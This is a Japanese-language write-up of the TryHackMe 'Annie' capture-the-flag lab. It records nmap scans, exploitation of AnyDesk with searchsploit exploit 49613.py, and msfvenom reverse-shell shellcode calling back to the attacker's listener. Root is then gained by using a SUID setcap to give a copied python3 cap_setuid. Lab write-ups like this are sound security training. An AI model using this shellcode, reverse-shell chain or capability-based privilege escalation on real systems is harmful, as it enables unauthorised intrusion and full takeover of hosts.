# Annie CTF

https://tryhackme.com/room/annie

## Enumeration

```shell
TARGET=10.10.178.74
sudo bash -c "echo $TARGET   anney.thm >> /etc/hosts"
```

### ポートスキャン

```shell
root@ip-10-10-96-220:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-27 06:56 BST
Nmap scan report for anney.thm (10.10.178.74)
Host is up (0.000083s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
7070/tcp  open  realserver
40805/tcp open  unknown
MAC Address: 02:EA:7E:7B:C6:63 (Unknown)
```

SSH 以外は不明なポート。

```sh
root@ip-10-10-96-220:~# sudo nmap -sS -A -p22,7070,40805 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-27 06:57 BST
Nmap scan report for anney.thm (10.10.178.74)
Host is up (0.00015s latency).

PORT      STATE  SERVICE         VERSION
22/tcp    open   ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA)
|   256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA)
|_  256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519)
7070/tcp  open   ssl/realserver?
|_ssl-date: TLS randomness does not represent time
40805/tcp closed unknown
MAC Address: 02:EA:7E:7B:C6:63 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=5/27%OT=22%CT=40805%CU=39586%PV=Y%DS=1%DC=D%G=Y%M=02EA
OS:7E%TM=6835546A%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=107%TI=Z%CI=Z%
OS:II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301S
OS:T11NW7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%
OS:W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF
OS:=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
OS:IE(R=Y%DFI=N%T=40%CD=S)
```

```sh
root@ip-10-10-96-220:~# sudo nmap -sV -p22,7070,40805 --script vuln $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-27 06:59 BST
Nmap scan report for anney.thm (10.10.178.74)
Host is up (0.000093s latency).

PORT      STATE  SERVICE         VERSION
22/tcp    open   ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners:
|   cpe:/a:openbsd:openssh:7.6p1:
|     	CVE-2023-38408	9.8	https://vulners.com/cve/CVE-2023-38408
|     	B8190CDB-3EB9-5631-9828-8064A1575B23	9.8	https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23	*EXPLOIT*
|     	8FC9C5AB-3968-5F3C-825E-E8DB5379A623	9.8	https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623	*EXPLOIT*
|     	8AD01159-548E-546E-AA87-2DE89F3927EC	9.8	https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC	*EXPLOIT*
|     	5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A	9.8	https://vulners.com/githubexploit/5E6968B4-DBD6-57FA-BF6E-D9B2219DB27A	*EXPLOIT*
|     	2227729D-6700-5C8F-8930-1EEAFD4B9FF0	9.8	https://vulners.com/githubexploit/2227729D-6700-5C8F-8930-1EEAFD4B9FF0	*EXPLOIT*
|     	0221525F-07F5-5790-912D-F4B9E2D1B587	9.8	https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587	*EXPLOIT*
|     	CVE-2020-15778	7.8	https://vulners.com/cve/CVE-2020-15778
|     	SSV:92579	7.5	https://vulners.com/seebug/SSV:92579	*EXPLOIT*
|     	PACKETSTORM:173661	7.5	https://vulners.com/packetstorm/PACKETSTORM:173661	*EXPLOIT*
|     	F0979183-AE88-53B4-86CF-3AF0523F3807	7.5	https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807	*EXPLOIT*
|     	1337DAY-ID-26576	7.5	https://vulners.com/zdt/1337DAY-ID-26576	*EXPLOIT*
|     	CVE-2021-41617	7.0	https://vulners.com/cve/CVE-2021-41617
|     	95499236-C9FE-56A6-9D7D-E943A24B633A	6.9	https://vulners.com/githubexploit/95499236-C9FE-56A6-9D7D-E943A24B633A	*EXPLOIT*
|     	2C119FFA-ECE0-5E14-A4A4-354A2C38071A	6.9	https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A	*EXPLOIT*
|     	PACKETSTORM:189283	6.8	https://vulners.com/packetstorm/PACKETSTORM:189283	*EXPLOIT*
|     	F79E574D-30C8-5C52-A801-66FFA0610BAA	6.8	https://vulners.com/githubexploit/F79E574D-30C8-5C52-A801-66FFA0610BAA	*EXPLOIT*
|     	EDB-ID:46516	6.8	https://vulners.com/exploitdb/EDB-ID:46516	*EXPLOIT*
|     	EDB-ID:46193	6.8	https://vulners.com/exploitdb/EDB-ID:46193	*EXPLOIT*
|     	CVE-2025-26465	6.8	https://vulners.com/cve/CVE-2025-26465
|     	CVE-2019-6110	6.8	https://vulners.com/cve/CVE-2019-6110
|     	CVE-2019-6109	6.8	https://vulners.com/cve/CVE-2019-6109
|     	C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3	6.8	https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3	*EXPLOIT*
|     	1337DAY-ID-39918	6.8	https://vulners.com/zdt/1337DAY-ID-39918	*EXPLOIT*
|     	10213DBE-F683-58BB-B6D3-353173626207	6.8	https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207	*EXPLOIT*
|     	CVE-2023-51385	6.5	https://vulners.com/cve/CVE-2023-51385
|     	PACKETSTORM:181223	5.9	https://vulners.com/packetstorm/PACKETSTORM:181223	*EXPLOIT*
|     	MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-	5.9	https://vulners.com/metasploit/MSF:AUXILIARY-SCANNER-SSH-SSH_ENUMUSERS-	*EXPLOIT*
|     	CVE-2023-48795	5.9	https://vulners.com/cve/CVE-2023-48795
|     	CVE-2020-14145	5.9	https://vulners.com/cve/CVE-2020-14145
|     	CVE-2019-6111	5.9	https://vulners.com/cve/CVE-2019-6111
|     	CC3AE4FC-CF04-5EDA-A010-6D7E71538C92	5.9	https://vulners.com/githubexploit/CC3AE4FC-CF04-5EDA-A010-6D7E71538C92	*EXPLOIT*
|     	54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C	5.9	https://vulners.com/githubexploit/54E1BB01-2C69-5AFD-A23D-9783C9D9FC4C	*EXPLOIT*
|     	EXPLOITPACK:98FE96309F9524B8C84C508837551A19	5.8	https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19	*EXPLOIT*
|     	EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	5.8	https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97	*EXPLOIT*
|     	1337DAY-ID-32328	5.8	https://vulners.com/zdt/1337DAY-ID-32328	*EXPLOIT*
|     	1337DAY-ID-32009	5.8	https://vulners.com/zdt/1337DAY-ID-32009	*EXPLOIT*
|     	EDB-ID:45939	5.3	https://vulners.com/exploitdb/EDB-ID:45939	*EXPLOIT*
|     	EDB-ID:45233	5.3	https://vulners.com/exploitdb/EDB-ID:45233	*EXPLOIT*
|     	CVE-2018-20685	5.3	https://vulners.com/cve/CVE-2018-20685
|     	CVE-2018-15919	5.3	https://vulners.com/cve/CVE-2018-15919
|     	CVE-2018-15473	5.3	https://vulners.com/cve/CVE-2018-15473
|     	CVE-2016-20012	5.3	https://vulners.com/cve/CVE-2016-20012
|     	SSH_ENUM	5.0	https://vulners.com/canvas/SSH_ENUM	*EXPLOIT*
|     	PACKETSTORM:150621	5.0	https://vulners.com/packetstorm/PACKETSTORM:150621	*EXPLOIT*
|     	EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	5.0	https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0	*EXPLOIT*
|     	EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	5.0	https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283	*EXPLOIT*
|     	1337DAY-ID-31730	5.0	https://vulners.com/zdt/1337DAY-ID-31730	*EXPLOIT*
|     	CVE-2025-32728	4.3	https://vulners.com/cve/CVE-2025-32728
|     	CVE-2021-36368	3.7	https://vulners.com/cve/CVE-2021-36368
|     	PACKETSTORM:151227	0.0	https://vulners.com/packetstorm/PACKETSTORM:151227	*EXPLOIT*
|     	PACKETSTORM:140261	0.0	https://vulners.com/packetstorm/PACKETSTORM:140261	*EXPLOIT*
|_    	1337DAY-ID-30937	0.0	https://vulners.com/zdt/1337DAY-ID-30937	*EXPLOIT*
7070/tcp  open   ssl/realserver?
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown:
40805/tcp closed unknown
MAC Address: 02:EA:7E:7B:C6:63 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.98 seconds
```

nc で接続すると、7070 ポートは何かを送ると切断される。40805 は接続拒否。

CVE-2023-38408 は SSH 接続できる場合に他人の SSH セッションを乗っ取る脆弱性のため、少なくともすぐには使えない。  
https://github.com/LucasPDiniz/CVE-2023-38408

```sh
$ sudo nmap -sS -A --script safe -p22,7070 $TARGET

7070/tcp open  realserver?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=AnyDesk Client
| Not valid before: 2022-03-23T20:04:30
|_Not valid after:  2072-03-10T20:04:30
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 (99%), Linux 3.2 - 4.14 (96%), Linux 4.15 - 5.19 (96%), Linux 2.6.32 - 3.10 (96%), Linux 5.4 (95%), Linux 2.6.32 - 3.5 (94%), Linux 2.6.32 - 3.13 (94%), Linux 5.0 - 5.14 (94%), Android 9 - 10 (Linux 4.9 - 4.14) (93%), Adtran 424RG FTTH gateway (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`Subject: commonName=AnyDesk Client` に注目。

## AnyDesk

```sh
$ searchsploit anydesk
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
AnyDesk 2.5.0 - Unquoted Service Path Privilege Escalation                                                                                                                                               | windows/local/40410.txt
AnyDesk 5.4.0 - Unquoted Service Path                                                                                                                                                                    | windows/local/47883.txt
AnyDesk 5.5.2 - Remote Code Execution                                                                                                                                                                    | linux/remote/49613.py
AnyDesk 7.0.15 - Unquoted Service Path                                                                                                                                                                   | windows/local/51968.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

稼働しているバージョンは不明だが、RCE があるので試す。

スクリプトの IP アドレスは変えるが、ポートは 50001 のまま。

```sh
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.13.85.243 LPORT=7777 -b "\x00\x25\x26" -f python -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 119 (iteration=0)
x64/xor chosen with final size 119
Payload size: 119 bytes
Final size of python file: 680 bytes
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xa3\x31\x8f"
shellcode += b"\x4b\xf7\x32\x67\xd1\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xc9\x18\xd7\xd2\x9d"
shellcode += b"\x30\x38\xbb\xa2\x6f\x80\x4e\xbf\xa5\x2f\x68"
shellcode += b"\xa1\x31\x91\x2a\xfd\x3f\x32\x22\xf2\x79\x06"
shellcode += b"\xad\x9d\x22\x3d\xbb\x89\x69\x80\x4e\x9d\x31"
shellcode += b"\x39\x99\x5c\xff\xe5\x6a\xaf\x3d\x62\xa4\x55"
shellcode += b"\x5b\xb4\x13\x6e\x7a\xdc\xfe\xc1\x58\xe1\x64"
shellcode += b"\x84\x5a\x67\x82\xeb\xb8\x68\x19\xa0\x7a\xee"
shellcode += b"\x37\xac\x34\x8f\x4b\xf7\x32\x67\xd1"

$ python2 ./49613.py
sending payload ...
reverse shell should connect within 5 seconds
```

```sh
$ nc -nlvp 7777
listening on [any] 7777 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.107.125] 49702
id
uid=1000(annie) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
```

ユーザーフラグゲット。

## 権限昇格

```sh
annie@desktop:/home/annie$ id
uid=1000(annie) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
```

setcap に SUID が付いている。

```sh
annie@desktop:~$ find / -perm -u=s -type f -ls 2>/dev/null
   131142     12 -rwsr-xr-x   1 root     root        10232 Nov 16  2017 /sbin/setcap
   655379     44 -rwsr-xr-x   1 root     root        43088 Sep 16  2020 /bin/mount
   655430     64 -rwsr-xr-x   1 root     root        64424 Jun 28  2019 /bin/ping
   655397     44 -rwsr-xr-x   1 root     root        44664 Jan 25  2022 /bin/su
   655514     32 -rwsr-xr-x   1 root     root        30800 Aug 11  2016 /bin/fusermount
   655423     28 -rwsr-xr-x   1 root     root        26696 Sep 16  2020 /bin/umount
   803938    372 -rwsr-xr--   1 root     dip        378600 Jul 23  2020 /usr/sbin/pppd
   786802     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
   804179    428 -rwsr-xr-x   1 root     root       436552 Mar  2  2020 /usr/lib/openssh/ssh-keysign
   138895     16 -rwsr-xr-x   1 root     root        14328 Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
   138962     12 -rwsr-sr-x   1 root     root        10232 Dec 14  2021 /usr/lib/xorg/Xorg.wrap
   799962     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   803534     24 -rwsr-xr-x   1 root     root          22528 Jun 28  2019 /usr/bin/arping
   788281     40 -rwsr-xr-x   1 root     root          40344 Jan 25  2022 /usr/bin/newgrp
   799147    148 -rwsr-xr-x   1 root     root         149080 Jan 19  2021 /usr/bin/sudo
   799099     20 -rwsr-xr-x   1 root     root          18448 Jun 28  2019 /usr/bin/traceroute6.iputils
   787313     76 -rwsr-xr-x   1 root     root          76496 Jan 25  2022 /usr/bin/chfn
   787330     76 -rwsr-xr-x   1 root     root          75824 Jan 25  2022 /usr/bin/gpasswd
   787328     44 -rwsr-xr-x   1 root     root          44528 Jan 25  2022 /usr/bin/chsh
   787331     60 -rwsr-xr-x   1 root     root          59640 Jan 25  2022 /usr/bin/passwd
   801215     24 -rwsr-xr-x   1 root     root          22520 Jan 12  2022 /usr/bin/pkexec
```

Python3 をコピーして SUID を付ける。

```sh
annie@desktop:~$ cp /usr/bin/python3 ./
annie@desktop:~$ setcap cap_setuid+ep ./python3
annie@desktop:~$ getcap ./python3
./python3 = cap_setuid+ep
```

root シェル取得成功

```sh
annie@desktop:~$ ./python3
Python 3.6.9 (default, Dec  8 2021, 21:08:43)
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.setuid(0)
>>> os.system("/bin/bash")
root@desktop:~# id
uid=0(root) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
```

## 振り返り

- nmap で、AnyDesk を特定できなかったり、UDP 50001 ポートを空いていることを確認できなかったりで苦労した。同じリバースシェルを使っても機能したりしなかったり、いろいろ不安定な BOX だった。
- setcap に SUID が付いていることはすぐ気づいていたが、GTFOBins で検索しても出てこなかったので最初は何も考えずに見送ってしまっていた。
